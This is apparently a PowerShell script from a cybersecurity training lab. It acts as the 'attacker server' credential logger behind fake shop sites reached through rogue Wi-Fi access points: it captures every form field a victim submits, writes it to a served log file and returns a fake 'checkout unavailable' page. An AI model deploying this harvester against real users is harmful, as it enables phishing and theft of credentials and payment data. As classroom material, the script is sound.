<#
.SYNOPSIS
  The attacker server's "credential harvester" for Part 5. Started by Start-StaffLab.ps1 in a
  minimised window; closing the window stops it (re-run Start-StaffLab.ps1 to start it again).

.DESCRIPTION
  Caddyfile.attacker passes every form POST on the fake sites (192.168.75.11) to this script on
  127.0.0.1:8099. It appends one line per POST to inputs.txt in the fake shop's folder, so it is
  served at http://192.168.75.11/inputs.txt, and answers with the fake shop's "checkout
  unavailable" page. Only listens on 127.0.0.1: nothing on the network can reach it directly.
  Each line: time, the site the victim thought they were on, "from" (the address the request
  came from: a victim behind a Pineapple shows as that Pineapple's address on the cafe network),
  then every form field as typed.
#>
param(
    [string]$OutFile = 'C:\csl-lab\sites\fake-shop\inputs.txt',
    [int]$Port = 8099
)
$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.Web
$Host.UI.RawUI.WindowTitle = 'CSL lab credential logger (attacker server): closing this window stops it'
$u8 = New-Object Text.UTF8Encoding $false
if (-not (Test-Path $OutFile)) {
    [IO.File]::WriteAllText($OutFile, ("Typed into the attacker's fake sites (CSL lab, Part 5)`r`n" +
        "time | site | from (the Pineapple it came through) | form fields`r`n`r`n"), $u8)
}
$page = '<!doctype html><html><head><meta charset="utf-8"><title>CSL Shop</title><link rel="stylesheet" href="/style.css"></head><body><main><h1>Sorry!</h1><p>Our checkout is temporarily unavailable. Please try again later.</p></main></body></html>'
$pageBytes = [Text.Encoding]::UTF8.GetBytes($page)

$listener = New-Object Net.HttpListener
$listener.Prefixes.Add("http://127.0.0.1:$Port/")
$listener.Start()
Write-Host "Listening on 127.0.0.1:$Port; writing to $OutFile"
while ($listener.IsListening) {
    $ctx = $listener.GetContext()
    try {
        $rq = $ctx.Request
        $body = (New-Object IO.StreamReader($rq.InputStream, [Text.Encoding]::UTF8)).ReadToEnd()
        if ($body.Length -gt 4000) { $body = $body.Substring(0, 4000) }
        $form = [Web.HttpUtility]::ParseQueryString($body)
        # Strip line breaks so one POST can't fake extra lines in the file.
        $fields = @($form.AllKeys | Where-Object { $_ } | ForEach-Object { '{0}={1}' -f $_, ($form[$_] -replace '[\r\n\t]', ' ') }) -join '  '
        $site = $rq.Headers['X-Csl-Site']; if (-not $site) { $site = '?' }
        $from = $rq.Headers['X-Forwarded-For']; if (-not $from) { $from = '?' }
        $line = '{0} | {1} | {2} | {3}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), ($site -replace '[\r\n]', ''), ($from -replace '[\r\n]', ''), $fields
        if ($line.Length -gt 600) { $line = $line.Substring(0, 600) }
        [IO.File]::AppendAllText($OutFile, $line + "`r`n", $u8)
        Write-Host $line
        $ctx.Response.ContentType = 'text/html; charset=utf-8'
        $ctx.Response.OutputStream.Write($pageBytes, 0, $pageBytes.Length)
    } catch {
        Write-Host "error: $($_.Exception.Message)" -ForegroundColor Yellow
        $ctx.Response.StatusCode = 500
    } finally {
        $ctx.Response.Close()
    }
}
